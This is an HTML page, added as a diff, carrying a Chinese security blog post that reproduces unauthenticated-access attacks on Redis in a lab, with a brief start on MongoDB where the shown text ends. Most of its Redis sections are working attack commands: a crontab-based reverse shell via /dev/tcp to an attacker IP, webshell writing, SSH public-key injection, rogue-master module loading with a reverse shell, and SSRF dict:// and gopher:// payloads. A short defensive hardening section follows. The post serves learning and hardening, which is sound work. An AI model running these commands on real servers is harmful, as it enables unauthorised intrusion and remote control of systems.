@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="学习有关未授权漏洞,没写完））））">
+<meta property="og:type" content="article">
+<meta property="og:title" content="未授权漏洞复现">
+<meta property="og:url" content="http://atsud0.me/2020/11/20/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="学习有关未授权漏洞,没写完））））">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201120223754669.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201120224508469.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201120224654602.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201120224903729.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201120231259159.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201121084131135.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201121084435019.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201121084444962.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201121000741156.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201121001814594.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201121001923422.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201121002930152.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201121002917272.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201120232144128.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201121090914555.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201121091600632.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201125194127839.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201123185727734.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201123185754857.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201123185844024.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201123190038963.png">
+<meta property="article:published_time" content="2020-11-20T15:03:29.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.456Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="redis">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/image-20201120223754669.png">
+
+<link rel="canonical" href="http://atsud0.me/2020/11/20/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>未授权漏洞复现 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/11/20/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          未授权漏洞复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-11-20 23:03:29" itemprop="dateCreated datePublished" datetime="2020-11-20T23:03:29+08:00">2020-11-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">靶机实验</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>9.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>9 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>学习有关未授权漏洞,没写完））））</p>
+<a id="more"></a>
+
+<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>默认端口:<code>6379</code></p>
+<ul>
+<li>Windows下，绝对路径写webshell 、写入启动项。</li>
+<li>Linux下，绝对路径写webshell 、公私钥认证获取root权限 、利用contrab计划任务反弹shell。</li>
+</ul>
+<p>可以直接<code>nc</code>进去，又或者是用<code>redis-cli</code>工具</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201120223754669.png" alt="image-20201120223754669"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">info # 信息</span><br><span class="line">keys * # 查询所有键 （慎用，生产环境上直接执行，可能会出几百万条数据，导致炸了。）</span><br><span class="line">get key_name #获取键值</span><br><span class="line">set x 1# 设置 x为1</span><br><span class="line">config get dir # 获取当前目录</span><br><span class="line">config set dir &#x2F;root&#x2F;...# 设置目录</span><br><span class="line">config set dbfilename # 设置数据库文件名</span><br><span class="line">save # 保存</span><br><span class="line">flushall #删除所有数据</span><br><span class="line">del key #删除键为key的数据</span><br><span class="line">auth #认证</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="crontab-反弹shell"><a href="#crontab-反弹shell" class="headerlink" title="crontab 反弹shell"></a>crontab 反弹shell</h3><p>我只在Centos 6.10上测试了，其他系统未必可以。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.9.1&#x2F;1234 0&gt;&amp;1\n&quot; # 写反弹shell的内容</span><br><span class="line">+OK</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F; # cron的路径</span><br><span class="line">+OK</span><br><span class="line">config set dbfilename root # 设置保存的文件名为root</span><br><span class="line">+OK</span><br><span class="line">save </span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>
+
+<p>等一会就来shell了。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201120224508469.png" alt="image-20201120224508469"></p>
+<p>看下crontab的内容，怪不得要换行符呢。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201120224654602.png" alt="image-20201120224654602"></p>
+<p>redis运行日志默认只有DB saved on disk的记录</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201120224903729.png" alt="image-20201120224903729"></p>
+<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>写webshell和反弹crontab一样的，但是得符合以下条件：</p>
+<ol>
+<li>服务器具有web环境</li>
+<li>你知道WEB服务的绝对路径</li>
+<li>redis有在web目录的读写权限</li>
+</ol>
+<p>操作和反弹crontab几乎一样，在此不做过多介绍。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\n&lt;?php phpinfo()?&gt;\n&quot;</span><br><span class="line">+OK</span><br><span class="line">config set dir &#x2F;vhs&#x2F;kangle&#x2F;www</span><br><span class="line">+OK</span><br><span class="line">config set dbfilename x.php</span><br><span class="line">+OK</span><br><span class="line">save</span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>
+
+<h3 id="写入ssh-keygen公钥"><a href="#写入ssh-keygen公钥" class="headerlink" title="写入ssh-keygen公钥"></a>写入ssh-keygen公钥</h3><p>利用条件:</p>
+<ol>
+<li>ssh服务开放</li>
+<li>目标服务器有被连入过（.ssh目录</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">-ERR Changing directory: No such file or directory</span><br><span class="line"># 这种情况就是没有ssh目录的</span><br><span class="line"></span><br><span class="line">如果是出现权限不足的错误提示，那就说明redis不是root用户运行的</span><br></pre></td></tr></table></figure>
+
+<p>我懒，本机没有<code>redis-cli</code>客户端。所以继续用<code>nc</code>操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">+OK</span><br><span class="line">set x &quot;\n\n 你的id_rsa.pub公钥文件 \n\n&quot;</span><br><span class="line">+OK</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">+OK</span><br><span class="line">save</span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>
+
+<p>之后直接ssh。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201120231259159.png" alt="image-20201120231259159"></p>
+<h3 id="eval-执行lua脚本"><a href="#eval-执行lua脚本" class="headerlink" title="eval 执行lua脚本"></a>eval 执行lua脚本</h3><p><code>Redis2.6</code>后的版本有内置<code>lua</code>环境可以导致lua脚本</p>
+<p><strong>注意是2.6之后的版本</strong>，freebuf上有篇文章写了是Redis2.6以前的版本，结果我跑去下了个Redis 2.4直接就给我提示<code>ERR unknown command &#39;EVAL&#39;</code>。</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat hello2.lua</span><br><span class="line"><span class="keyword">local</span> msg = <span class="string">"hello,hack!"</span></span><br><span class="line"><span class="keyword">return</span> msg</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli eval &quot;$(cat hello2.lua)&quot; 0 -h 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201121084131135.png" alt="image-20201121084131135"></p>
+<p>但是执行不了系统命令</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#<span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">"whoami"</span>)</span><br><span class="line"><span class="keyword">local</span> t = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="keyword">local</span> a = t:<span class="built_in">read</span>(<span class="string">"*all"</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201121084435019.png" alt="image-20201121084435019"></p>
+<p><img src="https://images.atsud0.me/images/post/image-20201121084444962.png" alt="image-20201121084444962"></p>
+<p>因为 Redis 不允许脚本使用 os 等一部分全局变量。</p>
+<h3 id="4-unacc-主从复制"><a href="#4-unacc-主从复制" class="headerlink" title="4-unacc 主从复制"></a>4-unacc 主从复制</h3><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。</p>
+<p>下载<code>vulhub</code>后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub&#x2F;redis&#x2F;4-unacc&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h4 id="自动化攻击"><a href="#自动化攻击" class="headerlink" title="自动化攻击"></a>自动化攻击</h4><p>1、生成恶意.so文件，下载<code>RedisModules-ExecuteCommand使用make</code>编译即可生成。</p>
+<p>2.攻击端执行： python3 redis-master.py -r vul-ip -p 6379 -L hacker-ip -f RedisModulesSDK/exp.so</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;n0b0dyCN&#x2F;redis-rogue-server</span><br><span class="line">cd redis-rogue-server&#x2F;RedisModules-ExecuteCommand&#x2F;</span><br><span class="line">make</span><br><span class="line">cd ..</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">python3 redis-master.py -r 172.20.0.2 -p 6379 -L 172.20.0.1 -P 1233 -f RedisModulesSDK&#x2F;exp.so  -c &quot;id&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201121000741156.png" alt="image-20201121000741156"></p>
+<h4 id="手动复现过程"><a href="#手动复现过程" class="headerlink" title="手动复现过程"></a>手动复现过程</h4><p>构造恶意Redis服务器，监听本地端口1233，加载exp.so。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rogue-server.py --lport 1233 --exp redis-rogue-getshell&#x2F;RedisModulesSDK&#x2F;exp.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201121001814594.png" alt="image-20201121001814594"></p>
+<p>通过未授权连接到存在漏洞的redis服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#设置redis的备份路径为当前目录</span><br><span class="line">    config set dir .&#x2F;</span><br><span class="line">#设置备份文件名为exp.so，默认为dump.rdb</span><br><span class="line">    config set dbfilename exp.so</span><br><span class="line">#设置主服务器IP和端口</span><br><span class="line">    slaveof 172.20.0.1 1233</span><br><span class="line">#加载恶意模块</span><br><span class="line">    module load .&#x2F;exp.so</span><br><span class="line">#切断主从，关闭复制功能</span><br><span class="line">    slaveof no one </span><br><span class="line">#执行系统命令</span><br><span class="line">    system.exec &#39;whoami&#39;</span><br><span class="line">    system.rev 172.20.0.1 1230    </span><br><span class="line">#通过dump.rdb文件恢复数据</span><br><span class="line">    config set dbfilename dump.rdb</span><br><span class="line">#删除exp.so</span><br><span class="line">    system.exec &#39;rm .&#x2F;exp.so&#39;</span><br><span class="line">#卸载system模块的加载</span><br><span class="line">    module unload system</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201121001923422.png" alt="image-20201121001923422"></p>
+<h5 id="ssrf-getshell"><a href="#ssrf-getshell" class="headerlink" title="ssrf getshell"></a>ssrf getshell</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 因为服务器没有web环境，在大佬的脚本上做了些许改动。</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line">$url=$argv[<span class="number">1</span>];</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#查看当前redis的相关配置</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.172.131:6379&#x2F;info</span><br><span class="line"></span><br><span class="line">#设置备份文件名</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.172.131:6379&#x2F;config:set:dbfilename:exp.so</span><br><span class="line"></span><br><span class="line">#连接恶意Redis服务器</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.172.131:6379&#x2F;slaveof:192.168.172.129:1234</span><br><span class="line"></span><br><span class="line">#加载恶意模块</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.172.131:6379&#x2F;module:load:.&#x2F;exp.so</span><br><span class="line"></span><br><span class="line">#切断主从复制</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.172.131:6379&#x2F;slaveof:no:one</span><br><span class="line"></span><br><span class="line">#执行系统命令</span><br><span class="line"> ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.172.131:6379&#x2F;system.rev:192.168.172.129:9999</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="gopher-getshell"><a href="#gopher-getshell" class="headerlink" title="gopher getshell"></a>gopher getshell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#设置文件名，连接恶意Redis服务器</span><br><span class="line">gopher:&#x2F;&#x2F;192.168.172.131:6379&#x2F;_config%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.172.129%25201234%250d%250aquit</span><br><span class="line"></span><br><span class="line">#加载exp.so，反弹shell</span><br><span class="line">gopher:&#x2F;&#x2F;192.168.172.131:6379&#x2F;_module%2520load%2520.&#x2F;exp.so%250d%250asystem.rev%2520192.168.172.129%25209999%250d%250aquit</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://images.atsud0.me/images/post/image-20201121002930152.png" alt="image-20201121002930152"></p>
+<p><img src="https://images.atsud0.me/images/post/image-20201121002917272.png" alt="image-20201121002917272"></p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol>
+<li><p>防火墙或配置文件限制访问：配置文件新增:<code>bind 127.0.0.1</code></p>
+</li>
+<li><p>设置密码： <code>redis.conf</code>添加<code>requirepass mypasswd</code> # 不建议使用<code>redis-cli -a</code> 明文登陆</p>
+<p>设置密码后不能直接访问。<img src="https://images.atsud0.me/images/post/image-20201120232144128.png" alt="image-20201120232144128"></p>
+</li>
+<li><p>低权限运行 Redis 服务，为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置<code>redis.conf</code>文件开启日志记录，禁用/修改高危命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">logfile&quot;&#x2F;var&#x2F;log&#x2F;redis&#x2F;redis.log&quot;</span><br><span class="line">loglevel verbose</span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>结合上面的工作，最后再修改默认端口。</p>
+</li>
+</ol>
+<h3 id="本节参考链接"><a href="#本节参考链接" class="headerlink" title="本节参考链接"></a>本节参考链接</h3><ul>
+<li><a href="https://www.cnblogs.com/xiaozi/p/13089906.html" target="_blank" rel="noopener">Redis主从复制getshell技巧</a></li>
+<li><a href="https://www.freebuf.com/vuls/254160.html" target="_blank" rel="noopener">未授权漏洞学习</a></li>
+<li><a href="https://my.oschina.net/coderknock/blog/968487" target="_blank" rel="noopener">Redis Lua 脚本使用</a></li>
+</ul>
+<h2 id="Mongo"><a href="#Mongo" class="headerlink" title="Mongo"></a>Mongo</h2><p>默认端口：</p>
+<ul>
+<li><code>27017</code>mongod默认的端口</li>
+<li><code>27018</code> 设置 <em>–shardsvr</em> 运行变量或在配置文件里设置 <a href="https://mongoing.com/docs/reference/configuration-options.html#sharding.clusterRole" target="_blank" rel="noopener"><code>clusterRole</code></a> 为 <code>shardsvr</code> 时的默认端口</li>
+<li><code>27019</code>设置 <em>–configsvr</em> 运行变量或在配置文件中将 <a href="https://mongoing.com/docs/reference/configuration-options.html#sharding.clusterRole" target="_blank" rel="noopener"><code>clusterRole</code></a> 设置为 <code>configsvr</code> 时的默认端口</li>
+<li><code>28017</code>系统状态网页的默认端口。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull mongo</span><br><span class="line">docker run -d -p 27017:27017 --name mongodb mongo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show dbs；#列出有哪些数据库，数据库占用了多大的存储空间。</span><br><span class="line">db；#当前连接的是哪个数据库</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>直接上msf好了。</p>
